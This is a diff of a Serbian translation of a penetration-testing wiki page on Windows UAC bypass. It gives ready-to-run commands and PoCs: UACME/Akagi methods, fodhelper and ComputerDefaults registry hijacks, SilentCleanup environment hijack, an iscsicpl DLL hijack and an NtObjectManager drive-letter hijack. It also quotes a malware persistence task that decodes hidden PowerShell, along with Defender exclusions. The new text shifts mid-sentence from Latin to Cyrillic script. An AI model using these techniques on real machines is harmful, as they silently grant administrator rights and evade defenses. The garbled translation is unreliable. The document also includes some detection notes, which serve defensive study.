-Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Dokumentacija i alat su na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC bypass exploit-i
+### Exploiti za UAC bypass
 
-[**UACME**](https://github.com/hfiref0x/UACME) je kolekcija UAC bypass tehnika. Kompajlirajte ga pomoću Visual Studio-a ili MSBuild-a; build kreira nekoliko executable fajlova (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), zato izaberite metod koji odgovara ciljnom buildu.<sup>[[3]](#references)</sup>\
-Budite oprezni: neki bypass-i pokreću vidljive programe ili promptove koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>
+[**UACME**](https://github.com/hfiref0x/UACME) je zbirka tehnika za UAC bypass. Kompajlirajte je pomoću Visual Studio-a ili MSBuild-a; proces izgradnje kreira nekoliko izvršnih datoteka (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), pa izaberite metod koji odgovara ciljnoj verziji sistema.<sup>[[3]](#references)</sup>\
+Budite oprezni: neki bypass-i pokreću vidljive programe ili upite koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>
 
-UACME sadrži **build verziju od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
+UACME navodi **verziju build-a od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete da potražite tehniku koja utiče na vaše verzije:
+
 ```powershell
 PS C:\> [environment]::OSVersion.Version
 
@@ -189,42 +200,49 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Takođe, pomoću [ove](https://en.wikipedia.org/wiki/Windows_10_version_history) stranice određujete Windows izdanje `1607` na osnovu verzija builda.
 
-Praktičan tok rada je da prvo **procenite build hosta**, a tek onda pokrenete odgovarajuću metodu:
+Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu, na osnovu verzija builda možete utvrditi izdanje Windowsa `1607`.
+
+Praktičan postupak je da prvo **procenite build hosta**, a zatim pokrenete odgovarajuću metodu:
+
 ```cmd
 python main.py --scan uac
 Akagi64.exe 33 C:\Windows\System32\cmd.exe
 ```
-- `WinPwnage` brzo upoređuje lokalni build sa poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
-- `UACME` ostaje najbolji javni katalog za povezivanje bypass-a sa konkretnim build-om. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i napomene o izdanju umesto da pretpostavite da se stari PoC i dalje primenjuje bez izmena.<sup>[[3]](#references)[[9]](#references)</sup>
 
-### Always Notify-capable WNF/UIAccess chains (UACME 3.7.1)
+- `WinPwnage` brzo upoređuje lokalnu verziju sa poznatim UAC metodama, što je korisno za brzo odbacivanje neupotrebljivih PoC-ova.<sup>[[4]](#references)</sup>
+- `UACME` je i dalje najbolji javni katalog za povezivanje bypass-a sa tačnom verzijom. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i beleške o izdanju, umesto da pretpostavite da stari PoC i dalje funkcioniše nepromenjen.<sup>[[3]](#references)[[9]](#references)</sup>
 
-`Always Notify` ne eliminiše svaki UAC bypass. UACME 3.7.1 implementira tri nove x64 metode koje kombinuju stanje okruženja/protokola pod kontrolom korisnika sa ponašanjem povišenog scheduled task-a ili UIAccess-a i sve ih označava kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
+### WNF/UIAccess lanci kompatibilni sa Always Notify (UACME 3.7.1)
 
-- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` natera povišeni `taskhostw.exe` da izvrši side-load biblioteke `unifiedconsent.dll`. UACME ga prati od Windows 10 build 19041.
-- **84 — TabTip:** upotrebite isti primitive promenljive okruženja protiv UIAccess procesa `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od build-a, a zatim pređite iz dobijenog UIAccess konteksta visokog integriteta. UACME ga prati od Windows 8.1 / Server 2016.
-- **85 — Narrator:** otmite per-user `feedback-hub` protokol, pokrenite Narrator pomoću `Alt+CapsLock+F`, a zatim pokrenite upisivu kopiju `osk.exe` koja izvršava side-load biblioteke `OskSupport.dll`. Ovo zahteva interaktivni desktop i prati se od Windows 10 1809 / Server 2019.
+`Always Notify` ne eliminiše sve UAC bypass-e. UACME 3.7.1 implementira tri nova x64 metoda koja kombinuju stanje okruženja/protokola pod kontrolom korisnika sa ponašanjem povišenih zakazanih zadataka ili UIAccess-a i označava sve kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>
 
-Nakon što napravite payload units i Akagi prema dokumentaciji za UACME, pozovite odgovarajući broj metode (opciona komanda podrazumevano je `cmd.exe`):
+- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF-pokrenuti `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` navede povišeni `taskhostw.exe` da side-load-uje `unifiedconsent.dll`. UACME prati ovaj metod od Windows 10 build 19041.
+- **84 — TabTip:** upotrebite isti primitiv promenljive okruženja protiv UIAccess `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od verzije, a zatim pređite iz nastalog UIAccess konteksta visokog integriteta. UACME prati ovaj metod od Windows 8.1 / Server 2016.
+- **85 — Narrator:** preotmite korisnički `feedback-hub` protokol, upravljajte Narrator-om pomoću `Alt+CapsLock+F`, a zatim pokrenite upisivu kopiju `osk.exe` koja side-load-uje `OskSupport.dll`. Za ovo je potrebna interaktivna radna površina; metod se prati od Windows 10 1809 / Server 2019.
+
+Nakon što izgradite payload jedinice i Akagi, kao što je dokumentovano u UACME, pozovite odgovarajući broj metode (opciona komanda podrazumevano je `cmd.exe`):
+
 ```cmd
 Akagi64.exe 83 C:\Windows\System32\cmd.exe
 Akagi64.exe 84 C:\Windows\System32\cmd.exe
 Akagi64.exe 85 C:\Windows\System32\cmd.exe
 ```
-Metode 84 i 85 zavise od UIAccess-a/interakcije sa desktopom, zato nemojte očekivati da će raditi neizmenjeno iz Session 0 ili neinteraktivne servisne shell sesije. Sve tri metode menjaju stanje okruženja/protokola i pripremaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>
+
+Metode 84 i 85 zavise od UIAccess/interakcije sa desktopom, zato ne očekujte da rade neizmenjene iz Session 0 ili neinteraktivne servisne ljuske. Sve tri menjaju stanje okruženja/protokola i postavljaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-Pouzdani binarni fajl `fodhelper.exe` ima auto-elevaciju na modernom Windows-u. Prilikom pokretanja, on upituje putanju registry-ja po korisniku navedenu u nastavku, bez validacije `DelegateExecute` glagola. Postavljanje komande na toj lokaciji omogućava procesu sa Medium Integrity nivoom (korisnik je u grupi Administrators) da pokrene proces sa High Integrity nivoom bez UAC upita.
+Pouzdani binarni fajl `fodhelper.exe` automatski dobija povišene privilegije u modernom Windowsu. Kada se pokrene, proverava putanju registra za trenutnog korisnika navedenu ispod, a da pritom ne proverava glagol `DelegateExecute`. Postavljanjem komande na tu lokaciju, proces sa Medium Integrity nivoom (korisnik je član grupe Administrators) može da pokrene proces sa High Integrity nivoom bez UAC upita.
 
-Putanja registry-ja koju upituje fodhelper:
+Putanja registra koju proverava fodhelper:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
+
 <details>
-<summary>PowerShell koraci (podesite svoj payload, zatim ga aktivirajte)</summary>
+<summary>PowerShell koraci (podesite svoj payload, pa ga pokrenite)</summary>
+
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -243,15 +261,21 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 # 4) (Recommended) Cleanup
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
+
 </details>
 Napomene:
-- Funkcioniše kada je trenutni korisnik član grupe Administrators, a UAC nivo je podrazumevan/blag (ne Always Notify sa dodatnim ograničenjima).
-- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
-- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Za stealth izbegavajte UI-je koji zahtevaju interakciju.
+- Radi kada je trenutni korisnik član grupe Administrators, a nivo UAC-a je podrazumevani/lenient (ne Always Notify sa dodatnim ograničenjima).
+- Koristite putanju `sysnative` da biste pokrenuli 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
+- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Radi stealtha izbegavajte iskačuće korisničke interfejse.
 
-#### CurVer/extension hijack varijanta (HKCU only)
+#### Okidač `ComputerDefaults.exe` za isti rukovalac `ms-settings`
 
-Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` po korisniku. Auto-elevated binarni fajl i dalje razrešava handler pod `HKCU`, tako da administratorski token nije potreban za postavljanje ključeva:<sup>[[5]](#references)</sup>
+`ComputerDefaults.exe` razrešava istu asocijaciju `ms-settings\Shell\Open\command` za trenutnog korisnika kao `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nakon što podesite podrazumevanu komandu i praznu vrednost `DelegateExecute` kao što je navedeno iznad, koristite `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kao alternativni okidač; nemojte ponavljati podešavanje registra.<sup>[[13]](#references)[[14]](#references)</sup> I dalje važe preduslovi u vezi sa administratorskim nalogom srednjeg nivoa integriteta i UAC politikom navedeni iznad u napomenama za `fodhelper.exe`.<sup>[[2]](#references)[[3]](#references)</sup> UACME uvrštava ovaj okidač počevši od Windows 10 RS4 (build 17134), pa ga proverite na ciljnoj verziji.<sup>[[3]](#references)</sup>
+
+#### Varijanta otmice CurVer/ekstenzije (samo HKCU)
+
+Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju ProgID `ms-settings`** putem vrednosti `CurVer za trenutnog korisnika. Binarna datoteka koja se automatski povišuje i даље разреšава руковалац под `HKCU`, тако да за постављање кључева није потребан администраторски токен:<sup>[[5]](#references)</sup>
+
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
 New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
@@ -260,103 +284,110 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
-Nakon elevacije, malware često **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje detekcije (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao uz visok integritet. Tipičan persistence task čuva **XOR-enkriptovanu PowerShell skriptu** na disku i dekodira/izvršava je u memoriji svakog sata:<sup>[[5]](#references)</sup>
+
+Kada dobije povišene privilegije, malware često **onemogućava buduće upite** tako što postavlja `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje odbrane (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se pokretao sa visokim integritetom. Tipičan zadatak za persistence čuva **XOR-enkriptovanu PowerShell skriptu** na disku, a zatim je svakog sata dekodira i izvršava u memoriji:<sup>[[5]](#references)</sup>
+
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
-Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, zbog čega se detekcija oslanja na nadgledanje **`CurVer` hijack-a**, neovlašćene izmene `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>
 
-### UAC bypass putem `SilentCleanup` task-a (`HKCU\Environment\windir`)
+Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, pa se detekcija oslanja na praćenje **`CurVer` hijacka**, izmena `ConsentPromptBehaviorAdmin`, kreiranja Defender izuzetaka ili zakazanih zadataka koji dešifruju PowerShell u memoriji.<sup>[[5]](#references)</sup>
 
-`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti high integrity bez dijaloga za potvrdu.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim buildovima, jer UACME održava tehniku aktivnom, a nedavno praćenje problema pokazuje da Windows 11 24H2 možda zahteva samo manje izmene navodnika.<sup>[[3]](#references)</sup>
+### UAC bypass putem zadatka `SilentCleanup` (`HKCU\Environment\windir`)
+
+`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširenje na proizvoljnu komandu i dobiti visok nivo integriteta bez dijaloga za saglasnost.<sup>[[8]](#references)</sup> Ovu metodu i dalje vredi testirati na novijim verzijama, jer UACME i dalje podržava ovu tehniku, a nedavno praćenje problema ukazuje na to da Windows 11 24H2 možda zahteva samo manje izmene navodnika.<sup>[[3]](#references)</sup>
+
 ```cmd
 reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
 schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 reg delete "HKCU\Environment" /v windir /f
 ```
-Ako task navodi putanju u toj build verziji, ponovite pokušaj sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek obrišite `HKCU\Environment\windir` nakon testiranja.
 
-#### Još UAC bypass
+Ako zadatak na toj verziji navodi putanju u navodnicima, pokušajte ponovo sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek očistite `HKCU\Environment\windir` nakon testiranja.
 
-Mnogi klasični UAC bypass-i koji zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **potpunu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili service koji radi u **Session 0** često nisu dovoljni.
+#### Još UAC bypass tehnika
 
-To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **process** čija je vrednost **Session** jednaka **1**:
+Za mnoge klasične UAC bypass tehnike koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom potrebna je **potpuna interaktivna sesija** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.
 
-![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload - Još UAC bypass: Ovo možete dobiti pomoću meterpreter sesije. Migrirajte u process čija je vrednost Session...](<../../images/image (863).png>)
+Ovo često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **proces** čija je vrednost **Session** jednaka **1**:
+
+![Usmerite ms-settings ka prilagođenoj ekstenziji (.thm) i povežite tu ekstenziju sa našim payload-om - Još UAC bypass tehnika: Ovo možete uraditi pomoću meterpreter sesije. Migrirajte u proces čija je vrednost Session...](<../../images/image (863).png>)
 
 (_explorer.exe_ bi trebalo da radi)
 
-### UAC Bypass pomoću GUI-ja
+### UAC bypass pomoću GUI-ja
 
-Ako imate pristup **GUI-ju, jednostavno možete prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC dodaje.
+Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC predstavlja.
 
-Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa odatle možete direktno **pokrenuti** na primer **cmd** **kao admin**, bez ponovnog prikazivanja UAC prompta, kao kod [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.
+Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa biste odatle mogli direktno da **pokrenete**, na primer, **cmd** **kao administrator**, bez ponovnog UAC prompta, koristeći alat kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto **stealthy**.
 
-### Bučan brute-force UAC bypass
+### Bučni brute-force UAC bypass
 
-Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može neprestano zahtevati elevation dok ga korisnik ne prihvati.
+Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može više puta da zatraži podizanje privilegija dok korisnik ne prihvati.
 
 ### Sopstveni bypass - Osnovna metodologija za UAC bypass
 
-Ako pogledate **UACME**, primetićete da **mnogi UAC bypass-i zloupotrebljavaju DLL hijacking** (često tako što nateraju elevated binary da učita DLL kojim upravlja attacker iz writable putanje). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Ako pogledate **UACME**, primetićete da **mnoge UAC bypass tehnike zloupotrebljavaju DLL hijacking** (često tako što nateraju binarnu datoteku sa povišenim privilegijama da učita DLL pod kontrolom napadača sa putanje na koju može da se upisuje). [Pročitajte ovo da biste saznali kako da pronađete ranjivost na DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Pronađite binary koji će se **autoelevate** (proverite da se, kada se izvrši, pokreće na high integrity nivou).
-2. Pomoću procmon-a pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
-3. Verovatno ćete morati da **upišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32), gde nemate dozvole za upisivanje. Ovo možete zaobići pomoću:
-1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (zato što se ovaj alat izvršava sa high integrity nivoa).
-2. **IFileOperation**: Windows 10.
-4. Pripremite **skriptu** koja će kopirati vaš DLL u zaštićenu putanju i izvršiti ranjivi i autoelevated binary.
+1. Pronađite binarnu datoteku koja će **autoelevate** (proverite da li se pokreće sa high integrity level-ом).
+2. Pomoću procmon-a pronađite догађаје "**NAME NOT FOUND**" који могу бити рањиви на **DLL Hijacking**.
+3. Вероватно ћете морати да **упишете** DLL у неку **заштићену путању** (као што је C:\Windows\System32), у коју немате дозволу уписа. Ово можете заобићи помоћу:
+   1. **wusa.exe**: Windows 7, 8 и 8.1. Омогућава издвајање садржаја CAB датотеке у заштићене путање (јер се овај алат извршава са high integrity level-ом).
+   2. **IFileOperation**: Windows 10.
+4. Припремите **скрипту** за копирање DLL-а у заштићену путању и покретање рањиве бинарне датотеке која се аутоматски покреће са повишеним привилегијама.
 
-### Druga tehnika za UAC bypass
+### Још једна UAC bypass техника
 
-Sastoji se od praćenja da li **autoElevated binary** pokušava da iz **registry-ja** **pročita** **ime/putanju** nekog **binary-ja** ili **komande** koju treba **izvršiti** (ovo je interesantnije ako binary traži ove informacije unutar **HKCU**).
+Састоји се у праћењу да ли **autoElevated бинарна датотека** покушава да **прочита** из **registry-ја** **име/путању** бинарне датотеке или **команду** коју треба **извршити** (ово је занимљивије ако бинарна датотека тражи ове информације унутар **HKCU**).
 
-### UAC bypass preko `SysWOW64\iscsicpl.exe` + DLL hijack korisničkog `PATH`-a
+### UAC bypass преко `SysWOW64\iscsicpl.exe` + DLL hijack-а преко корисничког `PATH`-а
 
-32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete postaviti maliciozni `iscsiexe.dll` u folder u koji **korisnik može da upisuje**, a zatim izmeniti `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može učitati attacker DLL unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>
+32-битна датотека `C:\Windows\SysWOW64\iscsicpl.exe` је бинарна датотека која се **аутоматски покреће са повишеним привилегијама** и која се може злоупотребити да учита `iscsiexe.dll` према редоследу претраге. Ако можете да поставите злонамерни `iscsiexe.dll` у фасциклу у коју корисник може да уписује, а затим измените `PATH` тренутног корисника (на пример, преко `HKCU\Environment\Path`) тако да се претражује та фасцикла, Windows може да учита DLL нападача унутар процеса `iscsicpl.exe` са повишеним привилегијама **без приказивања UAC prompt-а**.<sup>[[1]](#references)[[6]](#references)</sup>
 
-Praktične napomene:
-- Ovo je korisno kada se trenutni korisnik nalazi u grupi **Administrators**, ali radi na **Medium Integrity** nivou zbog UAC-a.
-- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zaseban binary i nezavisno proverite njeno ponašanje.
-- Primitive predstavlja kombinaciju **auto-elevation** i **DLL search-order hijacking**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass-e koristan za proveru učitavanja DLL-a koji nedostaje.
+Практични савети:
+- Ово је корисно када је тренутниот корисник у **Administrators** групи, али због UAC-а ради са **Medium Integrity**.
+- Копија у **SysWOW64** директоријуму је релевантна за овај bypass. Третирајте копију у **System32** директоријуму као засебну бинарну датотеку и независно проверите њено понашање.
+- Ова техника комбинује **auto-elevation** и **DLL search-order hijacking**, па је исти ProcMon поступак који се користи за друге UAC bypass технике користан за проверу да ли недостаје учитавање DLL-а.
 
-Minimalni tok:
+Минимални поступак:
+
 ```cmd
 copy iscsiexe.dll %TEMP%\iscsiexe.dll
 reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
+
 Ideje za detekciju:
-- Upozoriti na `reg add` / upise u registry u `HKCU\Environment\Path` koji su neposredno praćeni pokretanjem `C:\Windows\SysWOW64\iscsicpl.exe`.
-- Tražiti `iscsiexe.dll` na lokacijama koje kontroliše **user**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
-- Povezati pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.
+- Upozorite na `reg add` / upisivanje u registar u `HKCU\Environment\Path` koje odmah prati izvršavanje `C:\Windows\SysWOW64\iscsicpl.exe`.
+- Potražite `iscsiexe.dll` na lokacijama koje kontroliše **korisnik**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
+- Povežite pokretanja `iscsicpl.exe` sa neočekivanim podređenim procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.
 
 ### Novija istraživanja koja vredi zasebno proveriti
 
-Neki lanci nakon 2024. više ne izgledaju kao klasični registry hijack napadi nad `HKCU\Software\Classes`. Na primer, poisoning activation-context cache-a može povezati **drive remap** i **DLL redirection** kako bi se prešlo sa srednjeg na visoki integritet kroz pouzdane UI / auto-elevated binarne datoteke kao što je `ctfmon.exe`, a kasnije i mete poput `fodhelper.exe`. Umesto dupliciranja velikog PoC-a ovde, proverite sažete primere payload-a u:
+Neki lanci objavljeni posle 2024. više ne liče na klasične otmice registra `HKCU\Software\Classes`. Na primer, trovanje keša activation-context može da poveže **preusmeravanje diska** i **DLL redirekciju** kako bi se sa srednjeg prešlo na visok nivo integriteta preko pouzdanog UI-ja / automatski podignutih binarnih datoteka, kao što je `ctfmon.exe`, i kasnijih meta poput `fodhelper.exe`. Umesto da ovde duplirate veliki PoC, pogledajte sažete primere payload-a u:
 
 {{#ref}}
 ../windows-local-privilege-escalation/windows-c-payloads.md
 {{#endref}}
 
-### Hijack slovnog označivača diska kroz DOS device map po sesiji prijavljivanja u okviru Administrator Protection (preview)
+### Otmica slova diska putem DOS mape uređaja po sesiji prijavljivanja u Administrator Protection (preview)
 
 > [!NOTE]
-> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje iz oktobra 2025. je povučeno i planirano za kasniji datum. Potvrdite da je **Admin Approval Mode with Administrator protection** zaista omogućen i da je uređaj restartovan pre testiranja ovih lanaca; sam string verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>
+> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje u oktobru 2025. je povučeno i planirano je za neki kasniji datum. Pre testiranja ovih lanaca proverite da li je **Admin Approval Mode with Administrator protection** zaista omogućen i da li je uređaj ponovo pokrenut; sama oznaka verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>
 
-Za kompletnu površinu napada `RAiLaunchAdminProcess` / UIAccess na preview build-ovima Windows 11 25H2, pogledajte posvećenu stranicu:
+Za ceo napadni prostor `RAiLaunchAdminProcess` / UIAccess na preview verzijama Windows 11 25H2, pogledajte namensku stranicu:
 
 {{#ref}}
 ../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se kreira lazy pomoću `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač impersonira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **owner** (nasleđuje `CREATOR OWNER`), što omogućava linkove slovnih označivača diskova koji imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>
+Windows 11 25H2 „Administrator Protection” koristi shadow-admin токене са мапама `\Sessions\0\DosDevices/<LUID>` по сесији. Direktorijum lenjo kreira `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač imitira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **vlasnik** (nasleđuje `CREATOR OWNER`), što omogućava veze slova diska koje imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>
 
 **Koraci:**
 
-1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da pokrenete shadow-admin `runonce.exe` bez prompta.
-2. Duplirajte njegov primarni token u **identification** token i impersonirajte ga prilikom otvaranja `\??`, kako biste primorali kreiranje `\Sessions\0\DosDevices/<LUID>` uz vlasništvo napadača.
-3. Kreirajte `C:` symlink koji pokazuje na storage pod kontrolom napadača; naknadni pristupi filesystem-u u toj sesiji razrešavaće `C:` ka putanji napadača, čime se omogućava DLL/file hijack bez prompta.
+1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da biste pokrenuli shadow-admin `runonce.exe` bez prompta.
+2. Duplirajte njegov primarni token kao token **identification** i imitirajte ga dok otvarate `\??` da biste prinudno kreirali `\Sessions\0\DosDevices/<LUID>` u vlasništvu napadača.
+3. Kreirajte `C:` symlink u toj lokaciji koji pokazuje na skladište pod kontrolom napadača; naredni pristupi fajl-sistemu u toj sesiji razrešavaju `C:` ka putanji napadača, omogućavajući DLL/file hijack bez prompta.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -368,24 +399,31 @@ Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | 
 $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
-Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** u okviru provajdera `Microsoft-Windows-LUA`. Događaji sadrže SID podnosioca zahteva, putanju aplikacije, ishod, upravljani administratorski nalog i metod autentifikacije, tako da ponovljeni pokušaji eksploatacije ili neuspešno upravljanje korisničkim interfejsom nisu bez telemetrije.<sup>[[10]](#references)</sup>
+
+Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** pod provajderom `Microsoft-Windows-LUA`. Događaji obuhvataju SID podnosioca zahteva, putanju aplikacije, ishod, upravljani administratorski nalog i metod autentifikacije, tako da ponovljeni pokušaji eksploatacije ili neuspešno upravljanje UI-jem ne prolaze bez telemetrije.<sup>[[10]](#references)</sup>
+
 ```cmd
